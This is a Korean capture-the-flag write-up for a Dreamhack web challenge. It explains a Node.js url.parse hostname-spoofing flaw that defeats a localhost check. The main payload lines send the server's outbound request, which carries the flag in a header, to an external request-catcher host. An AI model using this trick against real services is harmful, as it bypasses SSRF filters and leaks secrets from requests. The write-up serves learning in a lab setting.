#web-hacking
# Payload
```
http://host3.dreamhack.games:23044/fetch?url=https://amylo.requestcatcher.com*.localhost
```
# 검색 키워드
- nodejs url parse 취약점
# 해설
## 코드 분석
- index.js 파일을 분석한다.
- 11번째 줄에서 Express 애플리케이션에서 HTTP GET 요청을 처리하는 핸들러를 정의한다.
	- 이 핸들러는 /fetch 경로에 대한 요청을 처리한다.
- 18번째 줄에서 GET 인자로 url 쿼리 파라미터를 urlObject 번수에 저장한다.
- 19번째 줄에서 Node.js 내장 모듈인 url 모듈을 사용하여 URL 파싱을 진행하고, hostname값을 host 변수에 저장한다.
- 21번째 줄에서 host가 `localhost` 와 일치하지 않고, host가 `localhost` 로 끝나지 않으면 `rejected` 메시지를 보내고 끝난다.
	- 혹시라도 에러가 발생하면 `Invalid Url` 문구를 보내고 끝난다.
- 26번째 줄에서 위의 if문을 통과하고 나면, node_fetch 함수를 이용해 GET 메소드로 header에 Flag를 넣어 요청을 보내고, 그 결과를 화면에 보여 준다.

- package.json 파일을 분석한다.
- 여기에서 node-fetch의 버전이 `^2.6.6` 으로 지정되어 있다. 

- url 파싱된 결과가 localhost이면서 실제 요청은 공격자가 원하는 곳으로 보내기 위해서는 url 파싱 중 특수문자를 활용하여 hostname을 속여야 한다. (hostname spoofing)
	- 사용 가능한 특수문자 : `! $ * , ; = `
- hostname을 속여 원하는 곳에 요청을 보내게 하고, 그 요청의 헤더에 포함된 Flag를 가져 오는 것이 핵심이다.

- 여기에서 node.js의 url 라이브러리가 취약하다고 한다. (node.js는 `v19.1.0`, `v18.13.0` 에서 패치되었다고 한다.)
## 익스플로잇
- `/fetch?url=` 뒤에 `localhost:3000` 을 넣어 본다. 맨 처음 나왔던 Hello 메시지가 뜬다.
- 이제 url 호스트네임을 스푸핑해보자.
- 우선 테스트로 google.com에 요청을 보내 보자.
	- Payload : `http://host3.dreamhack.games:20732/fetch?url=https://google.com*.localhost`
	- Result : ![[Pasted image 20240717022606.png]]
	- google로 가긴 간 것 같은데 하위 경로로 `*.localhost` 로 접근하려고 하는 것을 볼 수 있다.
	- 우선 localhost가 아닌 다른 url로 요청을 보내는 데 성공했으니, 헤더 내용을 가져오는데 집중하자.
- 사용할 수 있는 도구는 여러 가지가 있다.
	- 도구 목록
		- [Dreamhack Tools](https://tools.dreamhack.games/)
		- [Request Catcher](https://requestcatcher.com/)
		- 수제 제작 웹서버
	- 드림핵 툴즈나 Request Catcher의 사용법은 크게 다르지 않다.
	- 원하는 url을 입력하고, 생성해 준 URL로 오는 Request의 내용을 볼 수 있게 해 주는 서비스이다.
- Request Catcher를 이용하여 진행하겠다.
	- Payload : `http://host3.dreamhack.games:20732/fetch?url=https://amylo.requestcatcher.com*.localhost`
	- 화면에는 `request caught` 라는 메시지가 표시된다. 정상이다.
	- 이제 Request Catcher에 가 보면 해당 url로 들어온 요청들이 표시된다.![[Pasted image 20240717023754.png]]
	- Cookie에서 Flag를 찾을 수 있다.
# 참조 링크
- [https://toss.tech/article/nodejs-security-contribution](https://toss.tech/article/nodejs-security-contribution)